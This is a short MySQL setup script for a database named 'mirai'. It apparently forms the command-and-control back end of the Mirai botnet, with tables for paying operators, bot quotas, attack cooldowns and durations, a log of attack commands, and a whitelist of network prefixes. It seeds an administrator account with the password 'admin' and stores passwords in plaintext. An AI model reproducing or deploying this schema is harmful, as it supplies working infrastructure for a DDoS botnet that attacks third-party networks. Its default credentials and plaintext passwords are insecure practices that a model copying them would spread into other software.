CREATE DATABASE IF NOT EXISTS mirai;
USE mirai;

CREATE TABLE IF NOT EXISTS users (
    id INT AUTO_INCREMENT PRIMARY KEY,
    username VARCHAR(32) NOT NULL UNIQUE,
    password VARCHAR(32) NOT NULL,
    max_bots INT NOT NULL DEFAULT 1000,
    admin TINYINT NOT NULL DEFAULT 0,
    last_paid INT NOT NULL DEFAULT 0,
    cooldown INT NOT NULL DEFAULT 0,
    duration_limit INT NOT NULL DEFAULT 0,
    wrc TINYINT NOT NULL DEFAULT 0,
    `intvl` INT NOT NULL DEFAULT 30,
    api_key VARCHAR(64) NOT NULL DEFAULT ''
);

CREATE TABLE IF NOT EXISTS history (
    id INT AUTO_INCREMENT PRIMARY KEY,
    user_id INT NOT NULL,
    time_sent INT NOT NULL,
    duration INT NOT NULL,
    command TEXT NOT NULL,
    max_bots INT NOT NULL
);

CREATE TABLE IF NOT EXISTS whitelist (
    id INT AUTO_INCREMENT PRIMARY KEY,
    prefix VARCHAR(32) NOT NULL,
    netmask TINYINT NOT NULL
);

INSERT IGNORE INTO users (username, password, max_bots, admin, api_key)
VALUES ('admin', 'admin', 9999, 1, 'ixf-lab-api-key');
